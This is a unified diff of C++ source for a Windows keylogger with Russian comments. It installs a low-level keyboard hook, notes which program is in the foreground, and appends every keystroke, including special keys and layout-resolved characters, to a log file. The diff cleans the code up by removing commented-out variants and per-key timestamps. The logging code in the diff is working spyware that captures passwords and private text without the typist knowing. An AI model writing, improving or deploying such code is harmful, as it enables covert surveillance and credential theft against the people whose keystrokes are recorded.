@@ -2,7 +2,6 @@
 #include <time.h>
 #include <iostream>
 #include <fstream>
-#include <winuser.h>
 using namespace std;
 
 // Функция обратного вызова. Срабатывает при нажатии
@@ -39,133 +38,6 @@ char *GetLogFileName()
     return logName;
 }
 
-// другой вариант проверки
-
-// void SecWriteSimlpKey(int key)
-// {
-//     char crrKey;
-//     HKL kbLayout;
-//     bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
-//     if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 ||
-//         (GetKeyState(VK_RSHIFT) & 0x0001) != 0 ||
-//         (GetKeyState(VK_LSHIFT) & 0x0001) != 0)
-//         {
-//             crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, kbLayout)
-//         }
-// }
-
-// Проверка нажатия caps+shift, запись обычных клавиш
-// void WriteSimpl(int key)
-// {
-//     if (GetKeyState(VK_CAPITAL) & 0x0001 && GetKeyState(VK_SHIFT) & 0x0001)
-//     {
-//         char c = toupper((char)key);
-//         file << c << GetTime();
-//     }
-//     else
-//     {
-//         char c = tolower((char)key);
-//         file << c << GetTime();
-//     }
-// }
-
-// void WriteKey(int key, HWND hwnd)
-// {
-//     switch (key)
-//     {
-//     case VK_BACK:
-//         file << "[BACKSPACE]" << GetTime();
-//         break;
-//     case VK_RETURN:
-//         file << "[ENTER]" << GetTime();
-//         break;
-//     case VK_SPACE:
-//         file << "[SPACE]" << GetTime();
-//         break;
-//     case VK_TAB:
-//         file << "[TAB]" << GetTime();
-//         break;
-//     case VK_SHIFT:
-//     case VK_LSHIFT:
-//     case VK_RSHIFT:
-//         file << "[SHIFT]" << GetTime();
-//         break;
-//     case VK_CONTROL:
-//     case VK_LCONTROL:
-//     case VK_RCONTROL:
-//         file << "[CTRL]" << GetTime();
-//         break;
-//     case VK_ESCAPE:
-//         file << "[ESC]" << GetTime();
-//         break;
-//     case VK_END:
-//         file << "[END]" << GetTime();
-//         break;
-//     case VK_HOME:
-//         file << "[HOME]" << GetTime();
-//         break;
-//     case VK_UP:
-//         file << "[UP]" << GetTime();
-//         break;
-//     case VK_DOWN:
-//         file << "[DOWN]" << GetTime();
-//         break;
-//     case VK_LEFT:
-//         file << "[LEFT]" << GetTime();
-//         break;
-//     case VK_RIGHT:
-//         file << "[RIGHT]" << GetTime();
-//         break;
-//     case 190:
-//     case 110:
-//         file << "." << GetTime();
-//         break;
-//     case 189:
-//     case 109:
-//         file << "[RIGHT]" << GetTime();
-//         break;
-//     case 20:
-//         file << "[CAPS]" << GetTime();
-//         break;
-//     default: // TODO: сомнительное решение
-//         // if (GetKeyState(VK_CAPITAL) & 0x0001 && GetKeyState(VK_SHIFT) & 0x0001)
-//         // {
-//         //     char c = toupper((char)key);
-//         //     file << c << GetTime();
-//         //     break;
-//         // }
-//         // else
-//         // {
-//         //     // char c = tolower(key);
-//         //     file << key << GetTime();
-//         // }
-//         // // file << key << GetTime();
-//         // break;
-//         char crrKey;
-
-//         bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
-
-//         if ((GetKeyState(VK_SHIFT) & 0x0001) != 0 ||
-//             (GetKeyState(VK_LSHIFT) & 0x0001) != 0 ||
-//             (GetKeyState(VK_RSHIFT) & 0x0001) != 0)
-//         {
-//             lower = !lower;
-//         }
-//         // id процесса
-//         DWORD pid;
-//         pid = GetWindowThreadProcessId(hwnd, NULL);
-//         HKL kbLayout;
-//         kbLayout = GetKeyboardLayout(pid);
-//         crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, kbLayout);
-//         if (!lower)
-//         {
-//             tolower(crrKey);
-//         }
-
-//         file << char(crrKey);
-//     }
-// }
-
 int Save(int key)
 {
     if (key == 1 || key == 2)
@@ -177,9 +49,6 @@ int Save(int key)
     wchar_t prevProgName[256];
     // Получение активного окна
     HWND hwnd = GetForegroundWindow();
-
-    // Раскладка клавиатуры
-
     // Если есть активное окно
     if (hwnd)
     {
@@ -191,81 +60,66 @@ int Save(int key)
         if (wcscmp(currProgName, prevProgName) != 0)
         {
             wcscpy(prevProgName, currProgName);
-            // file << "\n[" << GetTime() << "] [" << currProgName << "]\n";
-
             file << "\n\n[Program: \"" << currProgName << "\" - " << GetTime() << "]\n";
         }
     }
     switch (key)
     {
     case VK_BACK:
-        file << "[BACKSPACE]" << GetTime();
+        file << "[BACKSPACE]";
         break;
     case VK_RETURN:
-        file << "[ENTER]" << GetTime();
+        file << "[ENTER]";
         break;
     case VK_SPACE:
-        file << "[SPACE]" << GetTime();
+        file << "[SPACE]";
         break;
     case VK_TAB:
-        file << "[TAB]" << GetTime();
+        file << "[TAB]";
         break;
     case VK_SHIFT:
     case VK_LSHIFT:
     case VK_RSHIFT:
-        file << "[SHIFT]" << GetTime();
+        file << "[SHIFT]";
         break;
     case VK_CONTROL:
     case VK_LCONTROL:
     case VK_RCONTROL:
-        file << "[CTRL]" << GetTime();
+        file << "[CTRL]";
         break;
     case VK_ESCAPE:
-        file << "[ESC]" << GetTime();
+        file << "[ESC]";
         break;
     case VK_END:
-        file << "[END]" << GetTime();
+        file << "[END]";
         break;
     case VK_HOME:
-        file << "[HOME]" << GetTime();
+        file << "[HOME]";
         break;
     case VK_UP:
-        file << "[UP]" << GetTime();
+        file << "[UP]";
         break;
     case VK_DOWN:
-        file << "[DOWN]" << GetTime();
+        file << "[DOWN]";
         break;
     case VK_LEFT:
-        file << "[LEFT]" << GetTime();
+        file << "[LEFT]";
         break;
     case VK_RIGHT:
-        file << "[RIGHT]" << GetTime();
+        file << "[RIGHT]";
         break;
     case 190:
     case 110:
-        file << "." << GetTime();
+        file << ".";
         break;
     case 189:
     case 109:
-        file << "[RIGHT]" << GetTime();
+        file << "-";
         break;
     case 20:
-        file << "[CAPS]" << GetTime();
+        file << "[CAPS]";
         break;
-    default: // TODO: сомнительное решение
-        // if (GetKeyState(VK_CAPITAL) & 0x0001 && GetKeyState(VK_SHIFT) & 0x0001)
-        // {
-        //     char c = toupper((char)key);
-        //     file << c << GetTime();
-        //     break;
-        // }
-        // else
-        // {
-        //     // char c = tolower(key);
-        //     file << key << GetTime();
-        // }
-        // // file << key << GetTime();
-        // break;
+    default:
         char crrKey;
 
         bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
@@ -311,7 +165,7 @@ int main()
 
     if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
     {
-        printf("Something go wrong!");
+        cout << "Something goes wrong!";
     }
     // Открываем файл лога
     file.open(GetLogFileName(), ios::app | ios::out);
